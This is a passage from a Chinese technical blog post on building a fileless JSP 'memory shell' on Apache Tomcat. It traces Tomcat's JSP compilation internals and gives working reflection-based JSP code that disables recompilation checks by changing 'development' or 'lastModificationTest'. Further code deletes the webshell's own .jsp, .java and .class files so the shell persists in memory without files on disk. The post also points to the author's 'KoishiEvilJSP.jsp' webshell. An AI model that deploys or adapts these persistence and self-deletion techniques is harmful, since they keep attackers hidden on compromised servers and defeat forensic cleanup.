<p><strong>说一下这个getServlet</strong></p>
<blockquote>
<p>首先判断<code>theServlet</code>是否为空，如果为空则表示还没有为JSP文件创建过Servlet，则通过<code>InstanceManager.newInstance</code>创建Servlet,并将创建的Servlet保存在<code>theServlet</code>属性中</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Servlet <span class="title function_">getServlet</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">// getReloadInternal是否Reload默认为False，也就是说如果theServlet为true就会直接返回。</span></span><br><span class="line">        <span class="keyword">if</span> (getReloadInternal() || theServlet == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getReloadInternal() || theServlet == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="comment">//如果theServlet中有值则销毁该Servlet.</span></span><br><span class="line">                    destroy();</span><br><span class="line">                    <span class="keyword">final</span> Servlet servlet;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//创建Servlet实例</span></span><br><span class="line">                        <span class="type">InstanceManager</span> <span class="variable">instanceManager</span> <span class="operator">=</span> InstanceManagerFactory.getInstanceManager(config);</span><br><span class="line">                        servlet = (Servlet) instanceManager.newInstance(ctxt.getFQCN(), ctxt.getJspLoader());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="type">Throwable</span> <span class="variable">t</span> <span class="operator">=</span> ExceptionUtils</span><br><span class="line">                                .unwrapInvocationTargetException(e);</span><br><span class="line">                        ExceptionUtils.handleThrowable(t);</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JasperException</span>(t);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">//初始化servlet</span></span><br><span class="line">                    servlet.init(config);</span><br><span class="line">                    <span class="keyword">if</span> (theServlet != <span class="literal">null</span>) &#123;</span><br><span class="line">                        ctxt.getRuntimeContext().incrementJspReloadCount();</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">//将servlet保存到theServlet中，theServlet由volatile修饰，在线程之间可以共享。</span></span><br><span class="line">                    theServlet = servlet;</span><br><span class="line">                    reload = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> theServlet;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<p>其中<code>theServlet</code>是由<code>volatile</code>修饰的，在不同的线程之间可以共享，再通过<code>synchronized (this)</code>加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要<code>this</code>是一个值，那么<code>theServlet</code>属性的值是一样的，而<code>this</code>就是当前的<code>jspServletWrapper</code>，我们访问不同的JSP也是由不同的<code>jspServletWrapper</code>处理的。</p>
</blockquote>
<p><strong>要想要完成内存驻留，我们要解决下面的问题。</strong></p>
<blockquote>
<ul>
<li>请求后不去检查JSP文件是否存在</li>
<li>theServlet中一直保存着我们的servlet，当我们请求对应url还能交给我们的servlet处理</li>
</ul>
</blockquote>
<p>第二个问题比较容易，<code>theServlet</code>能否获取到Servlet或者获取到哪个Servlet，是与<code>jspServletWrapper</code>是有关的，而在<code>JspServlet#serviceJspFile</code>中，如果我们已经将Servlet注册过，可以根据url从<code>JspRuntimeContext</code>中获取得到对应的<code>jspServletWrapper</code>。</p>
<p><del>感觉最近学的太多了，现在看这个东西，脑袋好像装满了，进不去啊，看的头大。。。。继续看吧</del></p>
<h3 id="请求后不去检查JSP文件是否存在"><a href="#请求后不去检查JSP文件是否存在" class="headerlink" title="请求后不去检查JSP文件是否存在"></a>请求后不去检查JSP文件是否存在</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>在参考文章中说到：</p>
<blockquote>
<p>默认Tomcat是以开发模式运行的。一般我们遇到的Tomcat都是以开发模式运行的，所以会由<code>JspCompilationContext#compile</code>进行编译。看下编译部分都做了什么，Tomcat默认使用<code>JDTCompiler</code>编译，首先通过<code>isOutDated</code>判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件，通过<code>jspCompiler.compile()</code>编译。</p>
</blockquote>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                    <span class="comment">// 这里检测是否进行编译</span></span><br><span class="line">                    <span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                        ctxt.compile();</span><br><span class="line">                        mustCompile = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (compileException != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Throw cached compilation exception</span></span><br><span class="line">                    <span class="keyword">throw</span> compileException;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">........................</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中涉及到的编译方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException &#123;</span><br><span class="line">      <span class="comment">//获取编译器，默认使用JDTCompiler编译</span></span><br><span class="line">        createCompiler();</span><br><span class="line">      <span class="comment">//通过isOutDated决定是否编译</span></span><br><span class="line">        <span class="keyword">if</span> (jspCompiler.isOutDated()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isRemoved()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>(jspUri);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//删除已经生成的java和Class文件</span></span><br><span class="line">                jspCompiler.removeGeneratedFiles();</span><br><span class="line">                jspLoader = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">//编译</span></span><br><span class="line">                jspCompiler.compile();</span><br><span class="line">                jsw.setReload(<span class="literal">true</span>);</span><br><span class="line">                jsw.setCompilationException(<span class="literal">null</span>);</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<p>如果我们能让 <code>options.getDevelopment()</code> 返回false就不会进入<code>complie</code>部分。</p>
<p><code>development</code>并不是一个<code>static</code>属性，所以不能直接修改，要拿到<code>options</code>的对象。<code>options</code>对象被存储在<code>JspServlet</code>中</p>
<p>而<code>MappingData</code>中保存了路由匹配的结果,<code>MappingData</code>的<code>wrapper</code>字段包含处理请求的<code>wrapper</code>，在Tomcat中，<code>Wrapper</code>代表一个Servlet，它负责管理一个 Servlet，包括的 Servlet的装载、初始化、执行以及资源回收。在<code>Wrapper</code>的<code>instance</code>属性中保存着<code>servlet</code>的实例，因此我们可以从<code>MappingData</code>中拿到<code>JspServlet</code>进而更改<code>options</code>的<code>development</code>属性值</p>
<p>所以我们可以通过反射对<code>development</code>的属性修改</p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.EmbeddedServletOptions&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//从request对象中获取request属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line">    <span class="comment">//获取MappingData</span></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="comment">//获取Wrapper</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line">    <span class="comment">//获取jspServlet对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line">    <span class="comment">//获取options中保存的对象 </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Option</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;options&quot;</span>);</span><br><span class="line">    Option.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">EmbeddedServletOptions</span> <span class="variable">op</span> <span class="operator">=</span> (EmbeddedServletOptions) Option.get(jspServlet);</span><br><span class="line">    <span class="comment">//设置development属性为false</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Developent</span> <span class="operator">=</span> op.getClass().getDeclaredField(<span class="string">&quot;development&quot;</span>);</span><br><span class="line">    Developent.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Developent.set(op,<span class="literal">false</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>当我们第二次请求我们的脚本</strong><code>development</code><br><strong>的属性值已经被改为false,即使我们删除对应的</strong><code>jsp\java\Class</code><strong>文件，仍然还可以还可以正常请求shell。</strong></p>
<p><strong>但是如果我们想修改一个已经加载为</strong><code>Servlet</code> <strong>的JSP文件，即使修改了也不会生效。</strong></p>
<p>因加载一次后mustCompile为false 且我们修改了Development值为false，不再进行重新编译改写了</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>在上面跟源码的时候，我们也能看见，在compile中，如果我们能让<code>isOutDated</code>返回false，也可以达到绕过的目的。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException &#123;</span><br><span class="line">        createCompiler();</span><br><span class="line">        <span class="keyword">if</span> (jspCompiler.isOutDated()) &#123;</span><br><span class="line">         ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>注意看下面的代码,在<code>isOutDated</code>中，当满足下面的条件则会返回false。<code>jsw</code>中保存的是<code>jspServletWarpper</code>对象，所以是不为null的，并且<code>modificationTestInterval</code>默认值是4也满足条件，所以我们现在要做的就是让<code>modificationTestInterval*1000</code>大于<code>System.currentTimeMillis()</code>,所以</p>
<p> <strong>只要将</strong><code>modificationTestInterval</code> <strong>修改为一个比较大的值也可以达到绕过的目的。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isOutDated</span><span class="params">(<span class="type">boolean</span> checkClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (jsw != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; (ctxt.getOptions().getModificationTestInterval() &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (jsw.getLastModificationTest()</span><br><span class="line">                    + (ctxt.getOptions().getModificationTestInterval() * <span class="number">1000</span>) &gt; System.currentTimeMillis()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p><code>modificationTestInterval</code>也保存在<code>options</code>属性中，所以修改的方法和方法一类似。</p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.servlet.JspServletWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.ConcurrentHashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.compiler.JspRuntimeContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line"></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">rctxt</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;rctxt&quot;</span>);</span><br><span class="line">    rctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspRuntimeContext</span> <span class="variable">jspRuntimeContext</span> <span class="operator">=</span> (JspRuntimeContext) rctxt.get(jspServlet);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">jspsF</span> <span class="operator">=</span> jspRuntimeContext.getClass().getDeclaredField(<span class="string">&quot;jsps&quot;</span>);</span><br><span class="line">    jspsF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ConcurrentHashMap</span> <span class="variable">jsps</span> <span class="operator">=</span> (ConcurrentHashMap) jspsF.get(jspRuntimeContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">JspServletWrapper</span> <span class="variable">jsw</span> <span class="operator">=</span> (JspServletWrapper)jsps.get(request.getServletPath());</span><br><span class="line">    jsw.setLastModificationTest(<span class="number">8223372036854775807L</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



<h3 id="实现自删除"><a href="#实现自删除" class="headerlink" title="实现自删除"></a>实现自删除</h3><p>上面只是分析了如何让我们的JSP在删除了<code>JSP\java\Class</code>文件后还能访问，下面我们分析如何在<code>JSP</code>中实现删除<code>JSP\java\Class</code>文件，在<code>JspCompilationContext</code>保存着 JSP 编译的上下文信息，我们可以从中拿到<code>java/class</code>的绝对路径。</p>
<p>而<code>JspCompilationContext</code>对象保存在<code>JspServletWrapper</code>中，所以要先获取<code>JspServletWrapper</code></p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//从request对象中获取request属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line">    <span class="comment">//获取MappingData</span></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="comment">//获取Wrapper，这里的Wrapper是StandrardWrapper</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line">    <span class="comment">//获取jspServlet对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line">    <span class="comment">//获取rctxt属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">rctxt</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;rctxt&quot;</span>);</span><br><span class="line">    rctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspRuntimeContext</span> <span class="variable">jspRuntimeContext</span> <span class="operator">=</span> (JspRuntimeContext) rctxt.get(jspServlet);</span><br><span class="line">    <span class="comment">//获取jsps属性内容</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">jspsF</span> <span class="operator">=</span> jspRuntimeContext.getClass().getDeclaredField(<span class="string">&quot;jsps&quot;</span>);</span><br><span class="line">    jspsF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ConcurrentHashMap</span> <span class="variable">jsps</span> <span class="operator">=</span> (ConcurrentHashMap) jspsF.get(jspRuntimeContext);</span><br><span class="line">    <span class="comment">//获取对应的JspServletWrapper</span></span><br><span class="line">    <span class="type">JspServletWrapper</span> <span class="variable">jsw</span> <span class="operator">=</span> (JspServletWrapper)jsps.get(request.getServletPath());</span><br><span class="line">    <span class="comment">//获取ctxt属性保存的JspCompilationContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">ctxt</span> <span class="operator">=</span> jsw.getClass().getDeclaredField(<span class="string">&quot;ctxt&quot;</span>);</span><br><span class="line">    ctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspCompilationContext</span> <span class="variable">jspCompContext</span> <span class="operator">=</span> (JspCompilationContext) ctxt.get(jsw);</span><br><span class="line">    File targetFile;</span><br><span class="line">    targetFile = <span class="keyword">new</span> <span class="title class_">File</span>(jspCompContext.getClassFileName());<span class="comment">//删掉jsp的.class</span></span><br><span class="line">    targetFile.delete();</span><br><span class="line">    targetFile = <span class="keyword">new</span> <span class="title class_">File</span>(jspCompContext.getServletJavaFileName());<span class="comment">//删掉jsp的java文件</span></span><br><span class="line">    targetFile.delete();</span><br><span class="line">    <span class="comment">//删除JSP文件</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">__jspName</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getSimpleName().replaceAll(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    String path=application.getRealPath(__jspName);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">    file.delete();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



<p><strong>tomcat7和8&#x2F;9的<code>MappingData</code>类包名发生了变化</strong></p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="code"><pre><span class="line">tomcat7:&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.http.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">tomcat8/<span class="number">9</span>:&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br></pre></td></tr></table></figure></div>



<p><strong>jsp马源码见项目中我写的： <code>KoishiEvilJSP.jsp</code></strong></p>
<p>该内存马能够成功执行</p>
<h3 id="字节码加载实现"><a href="#字节码加载实现" class="headerlink" title="字节码加载实现"></a>字节码加载实现</h3><p>一般情况下，我们想上传jsp然后访问执行是不现实的&#x3D;。&#x3D;，因为大多数时候不是热加载，而且也不符合我们对无文件shell的预期，于是这里我尝试修改jsp文件为java文件，并通过打字节码的方式，使jsp加载。（我看好像没啥这方面资料，全都是jsp落地，还是这种加载字节码的比较合适）</p>
<p><strong>详情见代码，emm没打通，可能是加载写的poc入口有问题，没加载上？</strong></p>
<p>后面debug调吧，现在挺忙的，我感觉写的代码应该没问题</p>
<h3 id="不足与缺点"><a href="#不足与缺点" class="headerlink" title="不足与缺点"></a><strong>不足与缺点</strong></h3><ul>
<li>由于jsp的servlet处理类一般都是JspServletWrapper类，所以对于这种自己实现JspServletWrapper类的方法很容易就可以被查杀</li>
<li>由于jsp的局限性，在MVC架构的背景下应用场景也不大</li>
</ul>
<h2 id="十三、JNI绕过RASP"><a href="#十三、JNI绕过RASP" class="headerlink" title="十三、JNI绕过RASP"></a>十三、JNI绕过RASP</h2><p>这个后面再看吧。目前这个还用不上</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
</search>
